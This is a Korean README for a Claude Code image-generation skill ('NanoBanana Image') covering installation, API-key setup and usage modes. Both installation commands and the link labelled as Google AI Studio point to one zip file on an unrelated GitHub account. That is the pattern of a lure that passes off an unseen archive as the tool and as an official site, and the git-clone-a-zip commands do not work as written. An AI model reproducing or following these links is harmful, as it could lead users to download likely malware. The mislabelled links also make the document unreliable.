# NanoBanana Image — Claude Code AI 이미지 생성 스킬

> 자연어 한 마디로 AI 이미지를 생성하고, 편집하고, 반복 수정하는 스킬

"벚꽃 터널 사진 만들어줘" 한 마디면 프롬프트 최적화 → 이미지 생성까지 자동으로 실행됩니다.

---

## 주요 기능

- 자연어 → 영문 프롬프트 자동 변환 (image_studio 시스템 프롬프트 내장)
- 7가지 이미지 모드 자동 감지 (인물/풍경/오브젝트/일러스트/썸네일/로고/컨셉트)
- 3가지 작업 모드: 새 생성(generate), 편집(edit), 반복 수정(chat)
- 비율/해상도/품질 자동 매핑 ("세로 인스타용" → 3:4, "빠르게 시안만" → Flash + 512)
- 멀티턴 세션: "아까 거 배경 바꿔줘" → 이전 결과 기반 수정

---

## 설치

### 방법 1: 스킬 폴더에 직접 복사

```bash
git clone https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip
cp -r nanobanana-image/ your-project/.claude/skills/nanobanana-image/
```

### 방법 2: .claude/skills에 클론

```bash
cd your-project/.claude/skills
git clone https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip
```

---

## 설정

### 1. .env 파일 생성

```bash
cd .claude/skills/nanobanana-image
cp .env.example .env
```

### 2. API 키 발급 및 입력

| 키 | 용도 | 발급처 |
|---|------|--------|
| `NANOBANANA_API_KEY` | AI 이미지 생성 (필수) | [Google AI Studio](https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip) |

**Google AI Studio에서 키 발급받기:**

1. https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip 접속
2. Google 계정으로 로그인
3. **"Create API key"** 클릭
4. 생성된 키를 복사

### 3. .env 파일에 키 입력

```bash
# .env 파일을 열고
nano .env

# NANOBANANA_API_KEY= 뒤에 복사한 키를 붙여넣기
NANOBANANA_API_KEY=AIzaSy...여기에_키_붙여넣기
```

### 선택 설정

`.env` 파일에서 추가로 설정할 수 있는 옵션:

| 설정 | 기본값 | 설명 |
|------|--------|------|
| `NANOBANANA_MODEL` | `gemini-3-pro-image-preview` | 사용할 모델 |
| `NANOBANANA_ASPECT_RATIO` | (없음) | 기본 비율 (`1:1`, `16:9`, `3:4` 등) |
| `NANOBANANA_IMAGE_SIZE` | (없음) | 기본 크기 (`512`, `1K`, `2K`, `4K`) |
| `NANOBANANA_THINKING_LEVEL` | (없음) | 사고 수준 (`minimal`, `high`) |
| `NANOBANANA_TIMEOUT` | `120` | API 타임아웃 (초) |

---

## 사용법

Claude Code에서:

```
"고양이 일러스트 만들어줘"
"유튜브 썸네일 생성해줘"
"이 이미지 배경 바꿔줘"
"아까 거 좀 더 밝게 해줘"
```

### 작업 모드

| 모드 | 트리거 | 설명 |
|------|--------|------|
| 새 생성 | "만들어줘", "그려줘", "생성해줘" | 프롬프트 최적화 → 이미지 생성 |
| 편집 | "이 이미지 수정해줘" + 파일 경로 | 기존 이미지를 변형 |
| 반복 수정 | "아까 거 바꿔줘", "색감 변경" | 이전 결과 기반 수정 (멀티턴) |

### 자동 매핑 예시

| 입력 | 자동 설정 |
|------|----------|
| "빨리 시안만" | Flash 모델 + 512px + minimal |
| "고품질 4K로" | Pro 모델 + 4K + high |
| "인스타용 세로" | 3:4 비율 |
| "유튜브 썸네일" | 16:9 비율 |
| "프로필 아이콘" | 1:1 비율 |

---

## 의존성

| 패키지 | 필수 | 설치 |
|--------|------|------|
| Python 3 | 필수 | - |
| `google-genai` (>=1.56.0) | 필수 | `pip install google-genai` |
| `Pillow` (>=10.0.0) | 편집 모드 시 | `pip install Pillow` |

---

## 파일 구조

```
nanobanana-image/
├── SKILL.md                          # 스킬 정의 (워크플로우)
├── .env.example                      # API 키 설정 템플릿
├── references/
│   └── image-studio-prompt.md        # 이미지 프롬프트 생성 시스템 프롬프트
└── scripts/
    └── generate_image.py             # google-genai SDK 이미지 생성 스크립트
```

---

## 라이선스

MIT
